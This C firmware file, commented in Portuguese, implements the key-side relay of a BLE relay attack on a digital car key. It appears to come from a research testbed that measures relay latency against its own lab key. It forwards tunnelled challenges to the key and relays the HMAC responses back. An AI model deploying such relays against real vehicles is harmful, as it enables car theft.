/*
 * Relay A — central BLE (perto do celular/chave) + enlace ESP-NOW.
 *
 * Papel no ataque:
 *   - recebe o nonce do Relay B por ESP-NOW (LINK_MSG_CHALLENGE);
 *   - escreve esse nonce na caracteristica CHALLENGE da chave real;
 *   - recebe o HMAC pela notify da chave e devolve por ESP-NOW (LINK_MSG_RESPONSE).
 *
 * Duas metades:
 *   - SELFTEST (RELAY_LINK_SELFTEST 1): Milestone 1, sem BLE. Finge ser a chave e ecoa
 *     o desafio de volta na hora, para o Relay B medir o RTT puro do tunel.
 *   - BLE (RELAY_LINK_SELFTEST 0): Milestone 2. Central NimBLE reaproveitando a logica
 *     do vehicle/main.c (scan pelo SVC_UUID -> conexao -> descoberta -> notify), porem
 *     SEM gerar nonce, SEM conferir HMAC e SEM medir RTT: o Relay A e um cano burro.
 *     Escreve na chave com resposta (ble_gattc_write_flat), igual ao vehicle faz no
 *     baseline, para que a unica diferenca medida seja o salto do relay.
 *
 * Contexto de execucao: o callback do ESP-NOW (on_link_rx) roda na task do WiFi e nao
 * pode fazer trabalho longo; por isso o desafio vindo do tunel e enfileirado e a escrita
 * GATT acontece na task 'write_worker'. O caminho inverso (notify da chave -> tunel) roda
 * na task do host NimBLE e chama link_send direto (esp_now_send nao bloqueia).
 */

#include "relay_a.h"
#include "relay_config.h"
#include "link.h"
#include "ble_contract.h"

#include <string.h>
#include "esp_log.h"
#include "esp_timer.h"

#include "cyd_display.h"
#include "cyd_led.h"
#include "cyd_ui.h"

static const char *TAG = "RELAY_A";

/* Cor de destaque do Relay A (roxo) e indices dos cards na UI. */
#define ACCENT 0x7C4DFF
enum { F_TUNEL = 0, F_CHAVE = 1, F_LINK = 2 };

/* Contadores mostrados no display (validos nos dois modos). */
static uint32_t s_from_tunnel;   /* desafios recebidos do Relay B */
static uint32_t s_from_key;      /* respostas vindas da chave (ou ecoadas no selfteste) */

/* Monta display + LED + UI. Chamado no inicio de relay_a_start (ambos os modos). */
static void relay_a_ui_init(void)
{
    cyd_display_init();
    cyd_led_init();
    cyd_display_set_backlight(90);
    cyd_ui_cfg_t cfg = {
        .title  = "RELAY A",
        .accent = ACCENT,
        .mascot = CYD_MASCOT_RELAY,
        .fields = { "Do tunel", "Da chave", "Chave", NULL },
        .hex0   = "nonce",
        .hex1   = NULL,
    };
    cyd_ui_init(&cfg);
    cyd_ui_set_field(F_TUNEL, "0");
    cyd_ui_set_field(F_CHAVE, "0");
    cyd_ui_set_field(F_LINK, "-");
}

#if !RELAY_LINK_SELFTEST

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"

#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
#include "host/ble_gatt.h"
#include "host/util/util.h"

static uint8_t  own_addr_type;
static uint16_t g_conn = BLE_HS_CONN_HANDLE_NONE;

/* Handles descobertos na conexao atual com a chave. */
static uint16_t svc_start, svc_end;
static uint16_t h_challenge, h_response, h_cccd;

/* Fila chave<-tunel: nonce a escrever, preenchida no callback ESP-NOW (task WiFi) e
 * consumida pela task write_worker (que pode chamar a API GATT com seguranca). */
typedef struct { uint8_t data[NONCE_LEN]; uint8_t len; } chal_item_t;
static QueueHandle_t chal_q;

/* Medidas por rodada (paper): turnaround de A = desafio escrito na chave -> notify da
 * chave (BLE A<->chave + calculo do HMAC). Nonce (4 B) correlaciona com os outros logs. */
static int64_t  s_t_write_us;
static uint8_t  s_nonce4[4];
static uint32_t s_round;

static void start_scan(void);
static int  gap_event(struct ble_gap_event *event, void *arg);

/* ---- resposta da chave -> tunel ----------------------------------------- */

static inline void forward_response(const uint8_t *resp, size_t len)
{
    link_send(LINK_MSG_RESPONSE, resp, len);
}

static void handle_notify(struct ble_gap_event *event)
{
    if (event->notify_rx.attr_handle != h_response) return;

    uint8_t resp[RESPONSE_LEN];
    uint16_t olen = 0;
    ble_hs_mbuf_to_flat(event->notify_rx.om, resp, RESPONSE_LEN, &olen);

    /* Turnaround local de A (desafio escrito na chave -> HMAC de volta): BLE A<->chave +
     * calculo do HMAC na chave. Linha CSVA parseavel por rodada, correlacionada pelo nonce. */
    int64_t turn = esp_timer_get_time() - s_t_write_us;
    int8_t rssi = 0;
    ble_gap_conn_rssi(g_conn, &rssi);
    ESP_LOGI(TAG, "HOP A rx_resp rodada=%lu nonce=%02x%02x%02x%02x turnaround=%lld us rssi=%d dBm",
             (unsigned long) s_round, s_nonce4[0], s_nonce4[1], s_nonce4[2], s_nonce4[3],
             (long long) turn, rssi);
    ESP_LOGI(TAG, "CSVA,%lu,%02x%02x%02x%02x,%lld,%d",
             (unsigned long) s_round, s_nonce4[0], s_nonce4[1], s_nonce4[2], s_nonce4[3],
             (long long) turn, rssi);

    ESP_LOGI(TAG, "HMAC da chave (%u B) -> tunel", olen);
    forward_response(resp, olen);

    s_from_key++;
    cyd_ui_set_field(F_CHAVE, "%lu", (unsigned long) s_from_key);
    cyd_ui_pulse();
}

/* ---- descoberta GATT (encadeada por callbacks, igual ao vehicle) -------- */

static int on_subscribe(uint16_t conn, const struct ble_gatt_error *err,
                        struct ble_gatt_attr *attr, void *arg)
{
    if (err->status != 0) {
        ESP_LOGE(TAG, "falha ao inscrever em notify (status=%d)", err->status);
        return 0;
    }
    ESP_LOGI(TAG, "inscrito em notify na chave; pronto para encaminhar desafios do tunel");
    return 0;
}

static int on_disc_dsc(uint16_t conn, const struct ble_gatt_error *err,
                       uint16_t chr_val_handle, const struct ble_gatt_dsc *dsc, void *arg)
{
    if (err->status == 0) {
        if (ble_uuid_cmp(&dsc->uuid.u, BLE_UUID16_DECLARE(0x2902)) == 0) {
            h_cccd = dsc->handle;
        }
    } else if (err->status == BLE_HS_EDONE) {
        if (h_cccd == 0) { ESP_LOGE(TAG, "CCCD (0x2902) ausente"); return 0; }
        uint8_t enable[2] = {0x01, 0x00};
        ble_gattc_write_flat(conn, h_cccd, enable, sizeof enable, on_subscribe, NULL);
    } else {
        ESP_LOGE(TAG, "disc dsc erro=%d", err->status);
    }
    return 0;
}

static int on_disc_chr_response(uint16_t conn, const struct ble_gatt_error *err,
                                const struct ble_gatt_chr *chr, void *arg)
{
    if (err->status == 0) {
        h_response = chr->val_handle;
    } else if (err->status == BLE_HS_EDONE) {
        if (h_response == 0) { ESP_LOGE(TAG, "caracteristica RESPONSE ausente"); return 0; }
        ble_gattc_disc_all_dscs(conn, h_response, svc_end, on_disc_dsc, NULL);
    } else {
        ESP_LOGE(TAG, "disc chr response erro=%d", err->status);
    }
    return 0;
}

static int on_disc_chr_challenge(uint16_t conn, const struct ble_gatt_error *err,
                                 const struct ble_gatt_chr *chr, void *arg)
{
    if (err->status == 0) {
        h_challenge = chr->val_handle;
    } else if (err->status == BLE_HS_EDONE) {
        if (h_challenge == 0) { ESP_LOGE(TAG, "caracteristica CHALLENGE ausente"); return 0; }
        ble_gattc_disc_chrs_by_uuid(conn, svc_start, svc_end,
                                    &CHR_RESPONSE_UUID.u, on_disc_chr_response, NULL);
    } else {
        ESP_LOGE(TAG, "disc chr challenge erro=%d", err->status);
    }
    return 0;
}

static int on_disc_svc(uint16_t conn, const struct ble_gatt_error *err,
                       const struct ble_gatt_svc *svc, void *arg)
{
    if (err->status == 0) {
        svc_start = svc->start_handle;
        svc_end   = svc->end_handle;
    } else if (err->status == BLE_HS_EDONE) {
        if (svc_start == 0) { ESP_LOGE(TAG, "servico da chave nao encontrado"); return 0; }
        ESP_LOGI(TAG, "servico em %u..%u", svc_start, svc_end);
        ble_gattc_disc_chrs_by_uuid(conn, svc_start, svc_end,
                                    &CHR_CHALLENGE_UUID.u, on_disc_chr_challenge, NULL);
    } else {
        ESP_LOGE(TAG, "disc svc erro=%d", err->status);
    }
    return 0;
}

/* ---- escrita do desafio na chave ---------------------------------------- */

static int on_write_challenge(uint16_t conn, const struct ble_gatt_error *err,
                              struct ble_gatt_attr *attr, void *arg)
{
    if (err->status != 0) ESP_LOGE(TAG, "escrita do desafio na chave erro=%d", err->status);
    return 0;
}

/* Task worker: desafio do tunel -> write na caracteristica CHALLENGE da chave. */
static void write_worker(void *arg)
{
    chal_item_t it;
    for (;;) {
        if (xQueueReceive(chal_q, &it, portMAX_DELAY) != pdTRUE) continue;

        if (g_conn == BLE_HS_CONN_HANDLE_NONE || h_challenge == 0) {
            ESP_LOGW(TAG, "desafio chegou mas a chave nao esta pronta; descarto");
            continue;
        }
        s_t_write_us = esp_timer_get_time();
        memcpy(s_nonce4, it.data, 4);
        s_round++;
        ESP_LOGI(TAG, "HOP A tx_chal rodada=%lu nonce=%02x%02x%02x%02x t=%lld us",
                 (unsigned long) s_round, it.data[0], it.data[1], it.data[2], it.data[3],
                 (long long) s_t_write_us);
        int rc = ble_gattc_write_flat(g_conn, h_challenge, it.data, it.len,
                                      on_write_challenge, NULL);
        if (rc != 0) ESP_LOGE(TAG, "ble_gattc_write_flat rc=%d", rc);
    }
}

/* ---- GAP: scan, conexao, notify (igual ao vehicle) ---------------------- */

static bool adv_has_service(const uint8_t *data, uint8_t len)
{
    struct ble_hs_adv_fields f;
    if (ble_hs_adv_parse_fields(&f, data, len) != 0) return false;
    for (int i = 0; i < f.num_uuids128; i++) {
        if (ble_uuid_cmp(&f.uuids128[i].u, &SVC_UUID.u) == 0) return true;
    }
    return false;
}

static int gap_event(struct ble_gap_event *event, void *arg)
{
    switch (event->type) {

    case BLE_GAP_EVENT_DISC:
        if (!adv_has_service(event->disc.data, event->disc.length_data)) break;
        ESP_LOGI(TAG, "chave encontrada, conectando...");
        ble_gap_disc_cancel();
        if (ble_gap_connect(own_addr_type, &event->disc.addr, 30000, NULL,
                            gap_event, NULL) != 0) {
            ESP_LOGE(TAG, "ble_gap_connect falhou; volto a escanear");
            start_scan();
        }
        break;

    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status == 0) {
            g_conn = event->connect.conn_handle;
            svc_start = svc_end = 0;
            h_challenge = h_response = h_cccd = 0;
            ESP_LOGI(TAG, "conectado a chave (handle %u); descobrindo servico", g_conn);
            cyd_ui_set_state("chave conectada", 0x1AA260);
            cyd_ui_set_field(F_LINK, "ok");
            ble_gattc_disc_svc_by_uuid(g_conn, &SVC_UUID.u, on_disc_svc, NULL);
        } else {
            ESP_LOGE(TAG, "conexao falhou (status=%d)", event->connect.status);
            start_scan();
        }
        break;

    case BLE_GAP_EVENT_DISCONNECT:
        ESP_LOGI(TAG, "chave desconectou (reason=%d); volto a escanear", event->disconnect.reason);
        g_conn = BLE_HS_CONN_HANDLE_NONE;
        h_challenge = h_response = h_cccd = 0;
        cyd_ui_set_field(F_LINK, "-");
        start_scan();
        break;

    case BLE_GAP_EVENT_NOTIFY_RX:
        handle_notify(event);
        break;

    default:
        break;
    }
    return 0;
}

static void start_scan(void)
{
    struct ble_gap_disc_params dp = {0};
    dp.filter_duplicates = 1;
    dp.passive = 0;
    int rc = ble_gap_disc(own_addr_type, BLE_HS_FOREVER, &dp, gap_event, NULL);
    if (rc != 0) ESP_LOGE(TAG, "ble_gap_disc rc=%d", rc);
    else { ESP_LOGI(TAG, "escaneando pelo servico da chave..."); cyd_ui_set_state("procurando chave", ACCENT); }
}

/* ---- ciclo de vida do host ---------------------------------------------- */

static void on_sync(void)
{
    if (ble_hs_util_ensure_addr(0) != 0) { ESP_LOGE(TAG, "sem endereco BLE"); return; }
    if (ble_hs_id_infer_auto(0, &own_addr_type) != 0) { ESP_LOGE(TAG, "infer addr falhou"); return; }
    start_scan();
}

static void on_reset(int reason) { ESP_LOGE(TAG, "BLE reset (reason=%d)", reason); }

static void host_task(void *param)
{
    nimble_port_run();
    nimble_port_freertos_deinit();
}

#endif /* !RELAY_LINK_SELFTEST */

/* ------------------------------------------------------------------------- */
/* Recebe frames do Relay B. Roda no contexto da task do WiFi.               */
/* ------------------------------------------------------------------------- */
static void on_link_rx(link_msg_type_t type, const uint8_t *data, size_t len)
{
    switch (type) {
    case LINK_MSG_CHALLENGE:
        s_from_tunnel++;
        cyd_ui_set_field(F_TUNEL, "%lu", (unsigned long) s_from_tunnel);
        cyd_ui_set_hex(0, data, (int) len);
        cyd_ui_pulse();
#if RELAY_LINK_SELFTEST
        /* Autoteste: devolve a resposta na hora (finge ser a chave). */
        ESP_LOGI(TAG, "[selfteste] desafio recebido (%d B); ecoando resposta", (int) len);
        link_send(LINK_MSG_RESPONSE, data, len);
        s_from_key++;   /* no selfteste o Relay A ecoa: conta como "resposta" */
        cyd_ui_set_field(F_CHAVE, "%lu", (unsigned long) s_from_key);
#else
    {
        /* Enfileira para a task worker escrever na chave (nao fazer GATT aqui). */
        chal_item_t it;
        it.len = (len > NONCE_LEN) ? NONCE_LEN : (uint8_t) len;
        memcpy(it.data, data, it.len);
        if (xQueueSend(chal_q, &it, 0) != pdTRUE)
            ESP_LOGW(TAG, "fila de desafios cheia; descarto");
    }
#endif
        break;
    default:
        break;
    }
}

void relay_a_start(void)
{
    relay_a_ui_init();
#if RELAY_LINK_SELFTEST
    cyd_ui_set_state("selfteste do tunel", ACCENT);
    cyd_ui_set_field(F_LINK, "echo");
    ESP_ERROR_CHECK(link_init(on_link_rx));
    ESP_LOGI(TAG, "Relay A iniciado (autoteste do tunel; ecoando desafios como se fosse a chave)");
#else
    /* Cria a fila e a task worker ANTES de link_init (que registra o callback do ESP-NOW),
     * para que nenhum frame caia em on_link_rx com a fila ainda nula. */
    chal_q = xQueueCreate(4, sizeof(chal_item_t));
    if (chal_q == NULL) { ESP_LOGE(TAG, "sem fila de desafios"); return; }
    xTaskCreate(write_worker, "write_wk", 4096, NULL, 10, NULL);

    ESP_ERROR_CHECK(link_init(on_link_rx));

    esp_err_t ret = nimble_port_init();
    if (ret != ESP_OK) { ESP_LOGE(TAG, "nimble_port_init rc=%d", ret); return; }

    ble_hs_cfg.reset_cb = on_reset;
    ble_hs_cfg.sync_cb  = on_sync;

    nimble_port_freertos_init(host_task);
    ESP_LOGI(TAG, "Relay A iniciado (BLE central: conecta na chave e tuneliza)");
#endif
}
